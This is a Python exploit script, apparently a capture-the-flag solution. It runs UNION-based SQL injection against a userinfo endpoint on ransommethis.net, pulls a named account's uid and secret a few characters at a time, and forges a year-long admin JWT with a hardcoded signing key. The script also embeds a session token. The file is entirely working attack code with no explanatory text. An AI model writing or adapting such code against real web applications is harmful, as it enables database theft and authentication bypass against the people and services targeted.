import requests
import jwt
from datetime import datetime, timedelta
from bs4 import BeautifulSoup

cookie = {'tok': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjE0MjU4MzMsImV4cCI6MTY5Mjk2MTg2MSwic2VjIjoiS0h0a3dRY0xleWlHYVdlU1MyTENuMVBRNWJ5OG41RzgiLCJ1aWQiOjQ1MjA0fQ.z2f5C3mFmM_x53L3pBvDpe-kr47BxblQGagjZQ656aw'}

# performs sql injection to leak data from database
def exploit_sql_injection(query):
    # get html for page with SQL injection results
    encoded_query = query.replace("'", "%27").replace(" ", "%20")
    url = f"https://padytccfzhyzlaza.ransommethis.net/nukoscislzmqpewx/userinfo?user={encoded_query}"
    html = BeautifulSoup(requests.get(url, cookies=cookie).text, 'html.parser')

    # extract values from html
    values = []
    for div in html.find_all('div'):
        if div['class'][0] == 'box' and div.h3.string.strip() != 'Date Joined:':
            values.append(int(div.p.string.strip()))

    return values

# perform SQL injections to extract uid and secret
uid, first, second = exploit_sql_injection("' UNION SELECT isAdmin, uid, UNICODE(SUBSTR(secret, 1, 1)), UNICODE(SUBSTR(secret, 2, 1)) FROM Accounts WHERE userName = 'SedateImpropriety'--")
chars = [chr(first), chr(second)]
for i in range(3, 32, 3):
    query = f"' UNION SELECT isAdmin, UNICODE(SUBSTR(secret, {i}, 1)), UNICODE(SUBSTR(secret, {i+1}, 1)), UNICODE(SUBSTR(secret, {i+2}, 1)) FROM Accounts WHERE userName = 'SedateImpropriety'--"
    chars.extend([chr(c) for c in exploit_sql_injection(query)])

secret = ''.join(chars)

# generate new admin token
hmac = "mvaVXwNo7sMKvDvIGxhNrsNfQUq6jYIu"
claims = {
    'iat': datetime.now(),
    'exp': datetime.now() + timedelta(days=365),
    'sec': secret,
    'uid': uid
}

print(jwt.encode(claims, hmac, algorithm='HS256'))